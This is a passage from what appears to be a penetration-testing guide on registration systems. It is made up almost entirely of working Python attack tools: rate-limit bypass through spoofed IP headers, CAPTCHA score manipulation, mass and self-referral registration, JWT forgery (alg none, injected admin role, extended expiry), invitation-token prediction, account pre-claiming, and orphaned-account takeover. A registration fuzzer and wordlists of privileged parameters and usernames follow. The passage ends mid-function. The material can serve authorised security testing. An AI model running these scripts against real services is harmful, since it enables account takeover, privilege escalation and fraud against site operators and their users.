                "status": resp.status_code
            })
        except Exception:
            pass

        # Test 2: Low score simulation (reCAPTCHA v3)
        for score in [0.0, 0.1, 0.3, 0.5, 0.7, 0.9, 1.0]:
            test_payload = {**payload, "recaptcha_score": score}
            try:
                resp = self.session.post(endpoint, json=test_payload)
                if resp.status_code in [200, 201]:
                    techniques.append({
                        "name": f"Score manipulation: {score}",
                        "success": True,
                        "status": resp.status_code
                    })
            except Exception:
                continue

        return {"techniques_tested": techniques}
```

---

### 2.4 Rate Limiting Bypass

```python
#!/usr/bin/env python3
"""
Rate Limiting Bypass Techniques
"""

import requests
import time
import asyncio
import aiohttp
from typing import Dict, List
import random
import string

class RateLimitBypass:
    def __init__(self, target_url: str):
        self.target_url = target_url
        self.session = requests.Session()

    def test_header_rotation(self, payload: Dict, count: int = 100) -> Dict:
        """Test bypassing rate limits with header rotation"""
        results = {"successful": 0, "blocked": 0, "errors": 0}

        for i in range(count):
            # Generate random IP
            random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

            headers = {
                "X-Forwarded-For": random_ip,
                "X-Real-IP": random_ip,
                "X-Client-IP": random_ip,
                "X-Originating-IP": random_ip,
                "CF-Connecting-IP": random_ip,
                "True-Client-IP": random_ip,
                "X-Forwarded-Host": f"client{i}.example.com",
                "X-Remote-IP": random_ip,
                "X-Remote-Addr": random_ip,
                "Forwarded": f"for={random_ip}",
            }

            try:
                resp = self.session.post(self.target_url, json=payload, headers=headers)
                if resp.status_code == 429:
                    results["blocked"] += 1
                elif resp.status_code in [200, 201]:
                    results["successful"] += 1
                else:
                    results["errors"] += 1
            except Exception:
                results["errors"] += 1

        return results

    def test_parameter_pollution(self, payload: Dict) -> List[Dict]:
        """Test rate limit bypass via parameter pollution"""
        techniques = []

        # Add null bytes
        null_payload = {**payload, "\x00": ""}
        # Add random parameters
        random_payload = {**payload, ''.join(random.choices(string.ascii_lowercase, k=8)): "1"}
        # Add array parameters
        array_payload = {**payload, "dummy[]": ["1", "2", "3"]}

        test_payloads = [
            ("null_byte", null_payload),
            ("random_param", random_payload),
            ("array_param", array_payload),
        ]

        for name, test_payload in test_payloads:
            for i in range(10):
                try:
                    resp = self.session.post(self.target_url, json=test_payload)
                    if i == 9:  # Record last attempt
                        techniques.append({
                            "technique": name,
                            "status": resp.status_code,
                            "bypassed": resp.status_code != 429
                        })
                except Exception:
                    continue

        return techniques

    def test_case_variation(self, endpoint: str) -> Dict:
        """Test rate limit bypass via URL case variation"""
        variations = [
            endpoint,
            endpoint.upper(),
            endpoint.lower(),
            endpoint.replace('/', '//'),
            endpoint + '/',
            endpoint + '?',
            endpoint + '#',
            endpoint + ';',
            endpoint + '/./',
            endpoint.replace('api', 'Api'),
            endpoint.replace('api', 'API'),
        ]

        results = []
        for var in variations:
            try:
                resp = self.session.post(var, json={})
                results.append({
                    "variation": var,
                    "status": resp.status_code,
                    "different_limit": resp.status_code != 429
                })
            except Exception:
                continue

        return {"variations_tested": results}

    def test_encoding_bypass(self, endpoint: str, payload: Dict) -> List[Dict]:
        """Test rate limit bypass via different encodings"""
        results = []

        # URL encoding variations
        import urllib.parse
        encoded_endpoints = [
            endpoint,
            urllib.parse.quote(endpoint, safe='/'),
            endpoint.replace('/', '%2F'),
            endpoint.replace('/', '%2f'),
            endpoint + '%00',
            endpoint + '%20',
        ]

        for enc_endpoint in encoded_endpoints:
            for i in range(5):
                try:
                    resp = self.session.post(enc_endpoint, json=payload)
                    if i == 4:
                        results.append({
                            "endpoint": enc_endpoint,
                            "status": resp.status_code,
                            "bypassed": resp.status_code != 429
                        })
                except Exception:
                    continue

        return results

    async def distributed_requests(self, payload: Dict, count: int = 100) -> Dict:
        """Simulate distributed attack using async requests"""
        results = {"successful": 0, "blocked": 0}

        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(count):
                random_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                headers = {"X-Forwarded-For": random_ip}
                task = self._async_request(session, payload, headers)
                tasks.append(task)

            responses = await asyncio.gather(*tasks, return_exceptions=True)

            for resp in responses:
                if isinstance(resp, dict):
                    if resp.get("status") == 429:
                        results["blocked"] += 1
                    elif resp.get("status") in [200, 201]:
                        results["successful"] += 1

        return results

    async def _async_request(self, session: aiohttp.ClientSession, payload: Dict, headers: Dict):
        try:
            async with session.post(self.target_url, json=payload, headers=headers) as resp:
                return {"status": resp.status}
        except Exception as e:
            return {"error": str(e)}

    def get_bypass_techniques(self) -> Dict:
        """Get all rate limit bypass techniques"""
        return {
            "header_based": [
                "X-Forwarded-For rotation",
                "X-Real-IP spoofing",
                "X-Client-IP manipulation",
                "X-Originating-IP injection",
                "CF-Connecting-IP (Cloudflare)",
                "True-Client-IP header",
                "Forwarded header (RFC 7239)",
            ],
            "request_based": [
                "HTTP method switching (GET/POST/PUT)",
                "Content-Type variation (json/form/xml)",
                "Parameter pollution",
                "Null byte injection",
                "Unicode normalization differences",
            ],
            "endpoint_based": [
                "Case variation (/API vs /api)",
                "Trailing slash (/api/ vs /api)",
                "Double slash (//api)",
                "Path normalization (/./ or /../)",
                "URL encoding (%2F for /)",
                "Adding query parameters",
                "Fragment identifier (#)",
            ],
            "timing_based": [
                "Request spreading over time",
                "Just under threshold requests",
                "Burst then pause pattern",
                "Gradual ramp-up",
            ],
            "infrastructure_based": [
                "Multiple source IPs",
                "Proxy rotation",
                "TOR exit nodes",
                "VPN switching",
                "Cloud function distribution",
            ]
        }
```

---

## 3. Logic Flaw Exploitation

### 3.1 Referral System Abuse

```python
#!/usr/bin/env python3
"""
Referral System Abuse Techniques
"""

import requests
import hashlib
import time
from typing import Dict, List
import re

class ReferralAbuse:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def self_referral_test(self, user_referral_code: str) -> Dict:
        """Test if user can refer themselves"""
        try:
            # Register new account with own referral code
            resp = self.session.post(
                f"{self.base_url}/api/register",
                json={
                    "email": f"selftest_{int(time.time())}@example.com",
                    "password": "TestPass123!",
                    "referral_code": user_referral_code
                }
            )

            return {
                "technique": "Self-referral",
                "status": resp.status_code,
                "success": resp.status_code in [200, 201],
                "response": resp.text[:200]
            }
        except Exception as e:
            return {"error": str(e)}

    def circular_referral_test(self, referral_codes: List[str]) -> Dict:
        """Test circular referral chains"""
        # A refers B, B refers C, C refers A
        results = []

        for i, code in enumerate(referral_codes):
            email = f"circular_test_{i}_{int(time.time())}@example.com"
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/register",
                    json={
                        "email": email,
                        "password": "TestPass123!",
                        "referral_code": code
                    }
                )
                results.append({
                    "referral_code": code,
                    "status": resp.status_code,
                    "success": resp.status_code in [200, 201]
                })
            except Exception:
                continue

        return {
            "technique": "Circular referral",
            "results": results
        }

    def referral_code_prediction(self, sample_codes: List[str]) -> Dict:
        """Analyze referral codes for predictable patterns"""
        analysis = {
            "samples": sample_codes,
            "patterns_detected": [],
            "predicted_codes": []
        }

        # Check for sequential patterns
        if all(code.isdigit() for code in sample_codes):
            codes_int = [int(c) for c in sample_codes]
            if len(set(codes_int[i+1] - codes_int[i] for i in range(len(codes_int)-1))) == 1:
                diff = codes_int[1] - codes_int[0]
                analysis["patterns_detected"].append(f"Sequential (diff={diff})")
                analysis["predicted_codes"] = [str(codes_int[-1] + diff * i) for i in range(1, 11)]

        # Check for hash-based patterns
        for code in sample_codes:
            if len(code) == 32:  # MD5
                analysis["patterns_detected"].append("Possible MD5 hash")
            elif len(code) == 40:  # SHA1
                analysis["patterns_detected"].append("Possible SHA1 hash")
            elif len(code) == 64:  # SHA256
                analysis["patterns_detected"].append("Possible SHA256 hash")

        # Check for timestamp-based
        current_ts = int(time.time())
        for code in sample_codes:
            try:
                code_int = int(code)
                if abs(code_int - current_ts) < 86400 * 365:  # Within a year
                    analysis["patterns_detected"].append("Possible timestamp-based")
                    break
            except ValueError:
                continue

        return analysis

    def mass_referral_registration(self, referral_code: str, count: int = 10) -> Dict:
        """Test mass registration with same referral code"""
        results = {"successful": 0, "failed": 0, "rate_limited": 0}

        for i in range(count):
            email = f"massref_{i}_{int(time.time())}@example.com"
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/register",
                    json={
                        "email": email,
                        "password": "TestPass123!",
                        "referral_code": referral_code
                    }
                )

                if resp.status_code == 429:
                    results["rate_limited"] += 1
                elif resp.status_code in [200, 201]:
                    results["successful"] += 1
                else:
                    results["failed"] += 1

                time.sleep(0.5)
            except Exception:
                results["failed"] += 1

        return results

    def referral_reward_manipulation(self) -> Dict:
        """Test techniques for referral reward manipulation"""
        return {
            "techniques": [
                {
                    "name": "Race condition on reward claim",
                    "description": "Submit multiple reward claims simultaneously",
                    "test": "Use async requests to claim reward multiple times"
                },
                {
                    "name": "Negative referral count",
                    "description": "Attempt to set negative referral count for overflow",
                    "payloads": ["referral_count=-1", "referrals=-999999999"]
                },
                {
                    "name": "Referral amount manipulation",
                    "description": "Modify referral reward amount in request",
                    "payloads": ["reward_amount=99999", "bonus=1000000"]
                },
                {
                    "name": "Duplicate referral tracking",
                    "description": "Register same email with different referral codes",
                    "test": "Use email aliases (user+1@, user+2@) with different referral codes"
                }
            ]
        }
```

---

### 3.2 Invitation Token Manipulation

```python
#!/usr/bin/env python3
"""
Invitation Token Manipulation Techniques
"""

import requests
import hashlib
import time
import base64
import jwt
import json
from typing import Dict, List
from urllib.parse import urlparse, parse_qs

class InvitationTokenManipulation:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def analyze_token(self, token: str) -> Dict:
        """Analyze invitation token structure"""
        analysis = {
            "token": token,
            "length": len(token),
            "encoding": "unknown",
            "structure": {},
            "vulnerabilities": []
        }

        # Check if base64
        try:
            decoded = base64.b64decode(token)
            analysis["encoding"] = "base64"
            analysis["decoded"] = decoded.decode('utf-8', errors='ignore')

            # Check if JSON inside
            try:
                json_data = json.loads(analysis["decoded"])
                analysis["structure"] = json_data
                analysis["vulnerabilities"].append("Token contains readable JSON - may be manipulable")
            except json.JSONDecodeError:
                pass
        except Exception:
            pass

        # Check if JWT
        if token.count('.') == 2:
            try:
                # Decode without verification
                parts = token.split('.')
                header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
                payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

                analysis["encoding"] = "JWT"
                analysis["structure"] = {
                    "header": header,
                    "payload": payload
                }

                if header.get("alg") == "none":
                    analysis["vulnerabilities"].append("Algorithm set to 'none' - signature bypass possible")
                if header.get("alg") in ["HS256", "HS384", "HS512"]:
                    analysis["vulnerabilities"].append("HMAC algorithm - try algorithm confusion attack")

            except Exception:
                pass

        # Check for timestamp
        try:
            token_int = int(token)
            current_ts = int(time.time())
            if abs(token_int - current_ts) < 86400 * 365:
                analysis["vulnerabilities"].append("Token appears to be timestamp-based - predictable")
        except ValueError:
            pass

        # Check if MD5/SHA hash
        if len(token) == 32:
            analysis["encoding"] = "Possibly MD5"
            analysis["vulnerabilities"].append("32-char token - may be weak MD5 hash")
        elif len(token) == 40:
            analysis["encoding"] = "Possibly SHA1"
            analysis["vulnerabilities"].append("40-char token - may be weak SHA1 hash")

        return analysis

    def test_token_reuse(self, token: str, email: str) -> Dict:
        """Test if invitation token can be reused"""
        results = []

        for i in range(3):
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/accept-invitation",
                    json={
                        "token": token,
                        "email": f"test_reuse_{i}_{int(time.time())}@example.com",
                        "password": "TestPass123!"
                    }
                )
                results.append({
                    "attempt": i + 1,
                    "status": resp.status_code,
                    "success": resp.status_code in [200, 201]
                })
                time.sleep(0.5)
            except Exception as e:
                results.append({"attempt": i + 1, "error": str(e)})

        return {
            "token": token[:20] + "...",
            "reuse_attempts": results,
            "reusable": sum(1 for r in results if r.get("success", False)) > 1
        }

    def test_token_modification(self, token: str) -> List[Dict]:
        """Test various token modifications"""
        results = []

        modifications = [
            token,
            token.upper(),
            token.lower(),
            token[::-1],  # Reverse
            token + "A",
            "A" + token,
            token.replace(token[10:15], "AAAAA") if len(token) > 15 else token,
        ]

        for mod_token in modifications:
            try:
                resp = self.session.get(
                    f"{self.base_url}/api/invitation/{mod_token}"
                )
                results.append({
                    "token": mod_token[:30] + "...",
                    "status": resp.status_code,
                    "valid": resp.status_code == 200
                })
            except Exception:
                continue

        return results

    def jwt_manipulation(self, jwt_token: str) -> List[Dict]:
        """JWT-specific manipulation techniques"""
        results = []

        try:
            parts = jwt_token.split('.')
            header = json.loads(base64.urlsafe_b64decode(parts[0] + '=='))
            payload = json.loads(base64.urlsafe_b64decode(parts[1] + '=='))

            # Algorithm none attack
            none_header = {**header, "alg": "none"}
            none_token = (
                base64.urlsafe_b64encode(json.dumps(none_header).encode()).decode().rstrip('=') +
                '.' +
                base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip('=') +
                '.'
            )
            results.append({
                "technique": "Algorithm none",
                "token": none_token
            })

            # Modify payload
            admin_payload = {**payload, "role": "admin", "is_admin": True}
            admin_token = (
                base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') +
                '.' +
                base64.urlsafe_b64encode(json.dumps(admin_payload).encode()).decode().rstrip('=') +
                '.' +
                parts[2]
            )
            results.append({
                "technique": "Payload modification (admin)",
                "token": admin_token
            })

            # Extend expiration
            if "exp" in payload:
                extended_payload = {**payload, "exp": payload["exp"] + 86400 * 365}
                extended_token = (
                    base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip('=') +
                    '.' +
                    base64.urlsafe_b64encode(json.dumps(extended_payload).encode()).decode().rstrip('=') +
                    '.' +
                    parts[2]
                )
                results.append({
                    "technique": "Expiration extension",
                    "token": extended_token
                })

        except Exception as e:
            results.append({"error": str(e)})

        return results

    def generate_prediction_tokens(self, sample_tokens: List[str]) -> List[str]:
        """Generate predicted tokens based on patterns"""
        predictions = []

        # If sequential integers
        try:
            ints = [int(t) for t in sample_tokens]
            if len(set(ints[i+1] - ints[i] for i in range(len(ints)-1))) == 1:
                diff = ints[1] - ints[0]
                for i in range(1, 20):
                    predictions.append(str(ints[-1] + diff * i))
                    predictions.append(str(ints[0] - diff * i))
        except ValueError:
            pass

        # Timestamp-based predictions
        current_ts = int(time.time())
        for offset in range(-300, 300, 10):
            predictions.append(str(current_ts + offset))
            predictions.append(hashlib.md5(str(current_ts + offset).encode()).hexdigest())

        return predictions
```

---

### 3.3 Pre-Registration Account Claim

```python
#!/usr/bin/env python3
"""
Pre-Registration Account Claim Attacks
"""

import requests
import time
from typing import Dict, List

class PreRegistrationAttack:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def test_unverified_email_claim(self, target_email: str) -> Dict:
        """
        Test if registering with unverified email can block/claim the account
        """
        try:
            # Register with target email (unverified)
            resp = self.session.post(
                f"{self.base_url}/api/register",
                json={
                    "email": target_email,
                    "password": "AttackerPass123!",
                    "username": f"attacker_{int(time.time())}"
                }
            )

            return {
                "technique": "Unverified email claim",
                "target_email": target_email,
                "registration_status": resp.status_code,
                "success": resp.status_code in [200, 201],
                "response": resp.text[:200],
                "impact": "If successful, legitimate user may be blocked from registering"
            }
        except Exception as e:
            return {"error": str(e)}

    def test_oauth_preemptive_link(self, target_email: str) -> Dict:
        """
        Information about OAuth preemptive linking attack
        """
        return {
            "technique": "OAuth Preemptive Linking",
            "description": "Register account with target's email via OAuth before they do",
            "steps": [
                f"1. Create OAuth account (Google/Facebook) with attacker email",
                f"2. Register on target site using OAuth",
                f"3. Change OAuth provider email to {target_email}",
                f"4. When victim tries to register, account already exists",
                f"5. Attacker may retain access or victim gets linked to attacker's account"
            ],
            "variations": [
                "OAuth linking to existing unverified account",
                "OAuth auto-merge based on email",
                "OAuth account before email verification completes"
            ]
        }

    def test_username_reservation(self, target_username: str) -> Dict:
        """Test if username can be reserved before email verification"""
        try:
            resp = self.session.post(
                f"{self.base_url}/api/register",
                json={
                    "email": f"attacker_{int(time.time())}@example.com",
                    "password": "AttackerPass123!",
                    "username": target_username
                }
            )

            return {
                "technique": "Username reservation",
                "target_username": target_username,
                "status": resp.status_code,
                "reserved": resp.status_code in [200, 201],
                "impact": "Target user cannot claim their preferred username"
            }
        except Exception as e:
            return {"error": str(e)}

    def test_profile_squatting(self, target_identifiers: List[str]) -> List[Dict]:
        """Test claiming profiles before legitimate users"""
        results = []

        for identifier in target_identifiers:
            try:
                resp = self.session.post(
                    f"{self.base_url}/api/register",
                    json={
                        "email": f"squat_{int(time.time())}@example.com",
                        "password": "SquatPass123!",
                        "username": identifier,
                        "display_name": identifier
                    }
                )

                results.append({
                    "identifier": identifier,
                    "status": resp.status_code,
                    "claimed": resp.status_code in [200, 201]
                })
                time.sleep(0.5)
            except Exception:
                continue

        return results
```

---

### 3.4 Orphaned Account Takeover

```python
#!/usr/bin/env python3
"""
Orphaned Account Takeover Techniques
"""

import requests
import time
from typing import Dict, List

class OrphanedAccountTakeover:
    def __init__(self, base_url: str):
        self.base_url = base_url
        self.session = requests.Session()

    def test_deleted_email_reuse(self, target_email: str) -> Dict:
        """
        Test if deleted account's email can be reclaimed
        """
        return {
            "technique": "Deleted email reuse",
            "description": "Register with email of deleted account to inherit data",
            "test_steps": [
                f"1. Target user deletes their account with {target_email}",
                "2. Attacker registers new account with same email",
                "3. Check if any data, connections, or history is inherited",
                "4. Check if linked third-party services still reference old account"
            ],
            "potential_impact": [
                "Access to old messages/data",
                "Inheritance of social connections",
                "Access to linked third-party accounts",
                "Recovery of 'deleted' data"
            ]
        }

    def test_unverified_account_takeover(self, target_email: str) -> Dict:
        """
        Test if unverified accounts can be taken over
        """
        try:
            # Try password reset on unverified account
            reset_resp = self.session.post(
                f"{self.base_url}/api/password-reset",
                json={"email": target_email}
            )

            # Try re-registration
            register_resp = self.session.post(
                f"{self.base_url}/api/register",
                json={
                    "email": target_email,
                    "password": "NewPass123!",
                    "username": f"takeover_{int(time.time())}"
                }
            )

            return {
                "technique": "Unverified account takeover",
                "target_email": target_email,
                "password_reset_status": reset_resp.status_code,
                "re_registration_status": register_resp.status_code,
                "takeover_possible": register_resp.status_code in [200, 201]
            }
        except Exception as e:
            return {"error": str(e)}

    def test_email_change_orphan(self) -> Dict:
        """
        Test if email change creates orphaned state
        """
        return {
            "technique": "Email change orphan attack",
            "scenario": [
                "1. User A registers with user@example.com",
                "2. User A changes email to new@example.com",
                "3. Attacker registers with user@example.com",
                "4. Check if attacker gains access to User A's data or sessions"
            ],
            "test_vectors": [
                "Password reset to old email after change",
                "Session persistence check after email change",
                "OAuth re-linking to old email",
                "API key persistence with old email"
            ]
        }

    def test_provider_account_recycle(self) -> Dict:
        """
        Information about OAuth provider account recycling
        """
        return {
            "technique": "OAuth provider account recycling",
            "description": "Exploit recycled OAuth provider accounts",
            "scenarios": [
                {
                    "provider": "Corporate email",
                    "scenario": "Employee leaves, email reassigned to new employee",
                    "attack": "New employee gains access to old accounts linked via SSO"
                },
                {
                    "provider": "Phone number",
                    "scenario": "Phone number recycled by carrier",
                    "attack": "New owner receives verification codes for old accounts"
                },
                {
                    "provider": "Username-based OAuth",
                    "scenario": "Username released after account deletion",
                    "attack": "New account with same username inherits OAuth links"
                }
            ],
            "mitigation_checks": [
                "Check if OAuth `sub` claim is used (unique per-user)",
                "Check if email-only linking is used (vulnerable)",
                "Check account age/creation date verification"
            ]
        }

    def test_incomplete_deletion(self, email: str) -> Dict:
        """
        Test for incomplete account deletion leaving orphaned data
        """
        try:
            # Register and immediately "delete"
            reg_resp = self.session.post(
                f"{self.base_url}/api/register",
                json={
                    "email": email,
                    "password": "TestPass123!",
                    "username": f"deletion_test_{int(time.time())}"
                }
            )

            if reg_resp.status_code not in [200, 201]:
                return {"error": "Registration failed", "status": reg_resp.status_code}

            # Get session/tokens
            auth_data = reg_resp.json() if reg_resp.headers.get('content-type', '').startswith('application/json') else {}

            # Attempt deletion
            delete_resp = self.session.delete(
                f"{self.base_url}/api/account",
                headers={"Authorization": f"Bearer {auth_data.get('token', '')}"}
            )

            # Wait and try to access with old credentials
            time.sleep(2)

            # Try various access methods
            checks = {
                "direct_login": False,
                "password_reset": False,
                "api_access": False,
                "profile_exists": False
            }

            # Try login
            login_resp = self.session.post(
                f"{self.base_url}/api/login",
                json={"email": email, "password": "TestPass123!"}
            )
            checks["direct_login"] = login_resp.status_code == 200

            # Try password reset
            reset_resp = self.session.post(
                f"{self.base_url}/api/password-reset",
                json={"email": email}
            )
            checks["password_reset"] = reset_resp.status_code == 200

            return {
                "technique": "Incomplete deletion test",
                "email": email,
                "deletion_status": delete_resp.status_code,
                "orphaned_access": checks,
                "incomplete_deletion": any(checks.values())
            }

        except Exception as e:
            return {"error": str(e)}
```

---

## 4. Wordlists and Resources

### 4.1 Common Registration Parameters

```
# Username parameters
username
user_name
userName
user
login
loginName
login_name
nick
nickname
handle
account
account_name
accountName
display_name
displayName
screen_name
screenName

# Email parameters
email
mail
e-mail
user_email
userEmail
email_address
emailAddress
primary_email
primaryEmail

# Password parameters
password
pass
passwd
pwd
secret
user_password
userPassword
new_password
newPassword
password1
pass1

# Confirmation parameters
password_confirmation
passwordConfirmation
confirm_password
confirmPassword
password2
pass2
verify_password
verifyPassword
repeat_password
repeatPassword

# Role/permission parameters
role
roles
role_id
roleId
user_type
userType
type
privilege
privileges
permission
permissions
access
access_level
accessLevel
is_admin
isAdmin
admin
is_staff
isStaff
is_superuser
isSuperuser
group
groups
group_id
groupId

# Status parameters
active
is_active
isActive
enabled
is_enabled
isEnabled
verified
is_verified
isVerified
confirmed
is_confirmed
isConfirmed
approved
is_approved
isApproved
status
account_status
accountStatus
email_verified
emailVerified
phone_verified
phoneVerified

# Subscription parameters
premium
is_premium
isPremium
paid
is_paid
isPaid
plan
subscription
subscription_type
subscriptionType
tier
level
credits
balance
quota
trial
is_trial
isTrial

# Referral parameters
referral
referral_code
referralCode
ref
ref_code
refCode
referred_by
referredBy
invite
invite_code
inviteCode
invitation
promo
promo_code
promoCode
coupon
coupon_code
couponCode
```

### 4.2 Reserved/Privileged Usernames

```
# Administrative
admin
administrator
root
superuser
sysadmin
webmaster
postmaster
hostmaster
operator
su
sudo

# System
system
sys
daemon
bin
nobody
www
www-data
apache
nginx
mysql
postgres
redis

# Support/Service
support
help
helpdesk
service
services
info
information
contact
sales
marketing
billing
abuse
security
noreply
no-reply
mailer-daemon
postmaster

# Generic reserved
test
demo
example
sample
guest
anonymous
public
private
internal
api
cdn
static
assets
media
upload
download

# Brand protection
official
verified
real
authentic
original
company
corp
corporate
enterprise
```

---

## 5. Automation Framework

### 5.1 Complete Registration Fuzzer

```python
#!/usr/bin/env python3
"""
Complete Registration Security Fuzzer
Comprehensive testing of registration endpoints
"""

import asyncio
import aiohttp
import json
import time
import hashlib
import random
import string
from typing import Dict, List, Optional, Callable
from dataclasses import dataclass
from enum import Enum

class VulnerabilityType(Enum):
    DUPLICATE_ACCOUNT = "duplicate_account"
    MASS_ASSIGNMENT = "mass_assignment"
    EMAIL_MANIPULATION = "email_manipulation"
    VERIFICATION_BYPASS = "verification_bypass"
    RATE_LIMIT_BYPASS = "rate_limit_bypass"
    REFERRAL_ABUSE = "referral_abuse"
    TOKEN_MANIPULATION = "token_manipulation"
    PRIVILEGE_ESCALATION = "privilege_escalation"

@dataclass
class Finding:
    vuln_type: VulnerabilityType
    severity: str
    description: str
    payload: Dict
    response: str
    remediation: str

class RegistrationFuzzer:
    def __init__(self, target_url: str, config: Dict = None):
        self.target_url = target_url
        self.config = config or {}
        self.findings: List[Finding] = []
        self.session = None

    async def run_all_tests(self) -> List[Finding]:
        """Run all registration security tests"""
        async with aiohttp.ClientSession() as self.session:
            # Run tests in parallel where possible
            await asyncio.gather(
                self.test_duplicate_accounts(),
                self.test_mass_assignment(),
                self.test_email_manipulation(),
                self.test_rate_limiting(),
            )

            # Sequential tests that depend on state
            await self.test_verification_bypass()
            await self.test_referral_abuse()

        return self.findings

    async def test_duplicate_accounts(self):
        """Test for duplicate account creation vulnerabilities"""
        email = f"dup_test_{int(time.time())}@example.com"

        # Race condition test
        tasks = []
        for i in range(20):
            payload = {
                "email": email,
                "password": "TestPass123!",
                "username": f"duptest{i}"
            }
            tasks.append(self._post(payload))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        successful = sum(1 for r in results if isinstance(r, dict) and r.get('status') in [200, 201])

        if successful > 1:
            self.findings.append(Finding(
                vuln_type=VulnerabilityType.DUPLICATE_ACCOUNT,
                severity="HIGH",
                description=f"Race condition allows {successful} duplicate accounts",
                payload={"email": email},
                response=f"{successful} successful registrations",
                remediation="Implement database-level unique constraints and atomic operations"
            ))

    async def test_mass_assignment(self):
        """Test for mass assignment vulnerabilities"""
        base_payload = {
            "email": f"mass_test_{int(time.time())}@example.com",
            "password": "TestPass123!",
            "username": f"masstest{int(time.time())}"
        }

        dangerous_params = [
            {"role": "admin"},
            {"is_admin": True},
            {"verified": True},
            {"email_verified": True},
            {"premium": True},
            {"credits": 999999},
            {"permissions": ["admin"]},
        ]

        for param in dangerous_params:
            payload = {**base_payload, **param}
            result = await self._post(payload)

            if result.get('status') in [200, 201]:
                # Check if the parameter was actually set
                response_text = result.get('body', '')
                param_key = list(param.keys())[0]

                if param_key in response_text or str(param[param_key]) in response_text:
                    self.findings.append(Finding(
                        vuln_type=VulnerabilityType.MASS_ASSIGNMENT,
                        severity="CRITICAL",
                        description=f"Mass assignment vulnerability: {param_key} can be set",
                        payload=param,
                        response=response_text[:200],
                        remediation="Implement strict allowlist for accepted parameters"
                    ))

    async def test_email_manipulation(self):
        """Test email manipulation techniques"""
        base_email = "test@gmail.com"

        variations = [
            # Case variations
            "TEST@gmail.com",
            "TeSt@Gmail.Com",
            # Dot tricks (Gmail)
            "t.est@gmail.com",
            "t.e.s.t@gmail.com",
            "te.st@gmail.com",
            # Plus addressing
            "test+admin@gmail.com",
            "test+1@gmail.com",
            # Subdomain/alias
            "test@googlemail.com",
        ]

        successful_variations = []
        for email in variations:
            payload = {
                "email": email,
                "password": "TestPass123!",
                "username": f"emailtest{int(time.time())}{random.randint(1,1000)}"
            }
            result = await self._post(payload)

            if result.get('status') in [200, 201]:
                successful_variations.append(email)

        if len(successful_variations) > 1:
            self.findings.append(Finding(
                vuln_type=VulnerabilityType.EMAIL_MANIPULATION,
                severity="MEDIUM",
                description=f"Multiple email variations accepted: {len(successful_variations)} accounts for same mailbox",
                payload={"variations": successful_variations},
                response="Multiple successful registrations",
                remediation="Normalize emails before storage (lowercase, remove dots for Gmail, etc.)"
            ))

    async def test_rate_limiting(self):
        """Test rate limiting effectiveness"""
        tasks = []
        for i in range(50):
            payload = {
                "email": f"ratelimit{i}_{int(time.time())}@example.com",
                "password": "TestPass123!",
                "username": f"ratelimit{i}_{int(time.time())}"
            }
            headers = {
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            tasks.append(self._post(payload, headers))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        successful = sum(1 for r in results if isinstance(r, dict) and r.get('status') in [200, 201])
        rate_limited = sum(1 for r in results if isinstance(r, dict) and r.get('status') == 429)

        if successful > 40 and rate_limited < 5:
            self.findings.append(Finding(
                vuln_type=VulnerabilityType.RATE_LIMIT_BYPASS,
                severity="MEDIUM",
                description=f"Weak rate limiting: {successful}/50 requests succeeded",
                payload={"requests": 50, "successful": successful},
                response=f"Rate limited: {rate_limited}",
                remediation="Implement proper rate limiting based on multiple factors (IP, fingerprint, etc.)"
            ))

    async def test_verification_bypass(self):
        """Test email verification bypass techniques"""
        # This would require actual registration flow testing
        # Simplified version checking for common issues

        bypass_payloads = [
            {"verified": True, "email_verified": True},
            {"skip_verification": True},
            {"verification_token": ""},
        ]

        for bypass in bypass_payloads:
            payload = {
                "email": f"verify_test_{int(time.time())}@example.com",
                "password": "TestPass123!",
                "username": f"verifytest{int(time.time())}",
                **bypass
            }
            result = await self._post(payload)

            if result.get('status') in [200, 201]:
                body = result.get('body', '').lower()
                if 'verified' in body and 'true' in body:
                    self.findings.append(Finding(
                        vuln_type=VulnerabilityType.VERIFICATION_BYPASS,
                        severity="HIGH",
                        description="Email verification can be bypassed via parameter injection",
                        payload=bypass,
                        response=result.get('body', '')[:200],
                        remediation="Server-side verification status, ignore client-supplied values"
                    ))

    async def test_referral_abuse(self):
        """Test referral system abuse"""
        # Self-referral test would require getting a valid referral code first
        # This is a placeholder for the test structure
        pass

    async def _post(self, payload: Dict, headers: Dict = None) -> Dict:
        """Make async POST request"""
        try:
            default_headers = {"Content-Type": "application/json"}
            if headers:
                default_headers.update(headers)

            async with self.session.post(
                self.target_url,
                json=payload,
                headers=default_headers,
                timeout=aiohttp.ClientTimeout(total=10)
            ) as resp:
                body = await resp.text()
                return {
                    "status": resp.status,
                    "body": body,
                    "headers": dict(resp.headers)
                }
        except Exception as e:
            return {"error": str(e)}

    def generate_report(self) -> str:
        """Generate findings report"""
        report = "# Registration Security Assessment Report\n\n"
        report += f"Target: {self.target_url}\n"
        report += f"Date: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"

        if not self.findings:
            report += "No vulnerabilities found.\n"
            return report

        report += f"## Summary\n\nTotal findings: {len(self.findings)}\n\n"

        # Group by severity
        critical = [f for f in self.findings if f.severity == "CRITICAL"]
        high = [f for f in self.findings if f.severity == "HIGH"]
        medium = [f for f in self.findings if f.severity == "MEDIUM"]

        report += f"- Critical: {len(critical)}\n"
        report += f"- High: {len(high)}\n"
        report += f"- Medium: {len(medium)}\n\n"

        report += "## Detailed Findings\n\n"

        for i, finding in enumerate(self.findings, 1):
